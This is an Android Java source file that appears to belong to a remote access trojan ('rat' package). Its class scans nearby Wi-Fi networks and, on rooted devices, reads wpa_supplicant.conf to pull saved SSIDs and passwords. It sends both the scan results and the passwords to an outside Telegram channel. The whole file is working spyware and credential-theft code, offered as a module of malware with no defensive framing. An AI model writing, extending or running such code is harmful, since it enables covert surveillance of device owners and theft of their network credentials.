package com.enterprise.rat.commands;

import android.content.Context;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import com.enterprise.rat.utils.TelegramApi;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.List;

public class WiFiScannerManager {
    private Context context;
    public WiFiScannerManager(Context context) { this.context = context; }

    public void scanNetworks() {
        WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (!wm.isWifiEnabled()) { TelegramApi.sendMessage("⚠ WiFi is off"); return; }
        wm.startScan();
        try { Thread.sleep(2000); } catch (InterruptedException e) {}
        List<ScanResult> results = wm.getScanResults();
        StringBuilder sb = new StringBuilder("<b>📡 WiFi Scan</b>\n\n");
        for (ScanResult r : results) sb.append("<b>SSID:</b> <code>").append(r.SSID).append("</code>\n<b>BSSID:</b> <code>").append(r.BSSID).append("</code>\n<b>Signal:</b> <code>").append(r.level).append("dBm</code>\n---\n");
        TelegramApi.sendMessage(sb.toString());
    }

    public void retrievePasswords() {
        StringBuilder sb = new StringBuilder("<b>🔑 WiFi Passwords</b>\n\n");
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "cat /data/misc/wifi/wpa_supplicant.conf"});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line, ssid = "";
            while ((line = br.readLine()) != null) {
                if (line.trim().startsWith("ssid=")) ssid = line.replace("ssid=", "").replace("\"", "").trim();
                if (line.trim().startsWith("psk=") && !ssid.isEmpty()) { sb.append("<b>SSID:</b> <code>").append(ssid).append("</code>\n<b>PSK:</b> <code>").append(line.replace("psk=", "").replace("\"", "").trim()).append("</code>\n\n"); }
            }
            p.waitFor();
        } catch (Exception e) { sb.append("Requires root"); }
        TelegramApi.sendMessage(sb.toString());
    }
}
